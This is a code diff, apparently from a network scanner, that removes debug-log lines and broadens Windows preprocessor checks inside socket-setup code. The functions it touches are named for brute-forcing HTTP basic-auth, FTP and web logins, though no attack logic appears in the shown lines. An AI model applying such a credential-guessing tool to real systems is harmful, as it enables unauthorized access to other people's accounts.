@@ -142,12 +142,10 @@ int OpenConnection(SOCKET *sock, const char *hostname, int port)
 	struct sockaddr_in addr;
 	if(strlen(hostname) == 0) 
 	{
-		stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
 		return -1;
 	};
 	if(port < 0 || port > 65535) 
 	{
-		stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad port.");
 		return -1;
 	};
 
@@ -410,7 +408,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 		sockAddr.sin_family = AF_INET;
 		sockAddr.sin_port = htons(port);
 		HOSTENT *host;
-#if defined(WIN32)
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
 		if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
 		else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
 		else
@@ -865,7 +863,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 	sockAddr.sin_port = htons(port);
 	HOSTENT *host;  
 
-#if defined(WIN32)
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
 	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
 	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
 	else 
@@ -1441,12 +1439,10 @@ int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *C
 	CSTR->lowerBuff = NULL;
 	if(strlen(ip) == 0) 
 	{	
-		stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
 		return -1;
 	};
 	if(port < 0 || port > 65535) 
 	{
-		stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad port.");
 		return -1;
 	};
 
@@ -1456,7 +1452,7 @@ int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *C
 	sockAddr.sin_port = htons(port);
 
 	HOSTENT *host;  
-#if defined(WIN32)
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
 	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
 #else
 	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
@@ -1479,7 +1475,7 @@ int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *C
 		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
 	};
 
-#if defined(WIN32)
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
 	u_long FAR cmd = 1;
 	if( ioctlsocket( sock , FIONBIO, &cmd ) != 0 )
 #else
@@ -2120,7 +2116,7 @@ int _webLoginSeq(char *request, char *login, char *pass, char *ip, int port, int
 	sockAddr.sin_family = AF_INET;  
 	sockAddr.sin_port = htons(port);
 	HOSTENT *host;  
-#if defined(WIN32)
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
 	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
 	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
 	else 
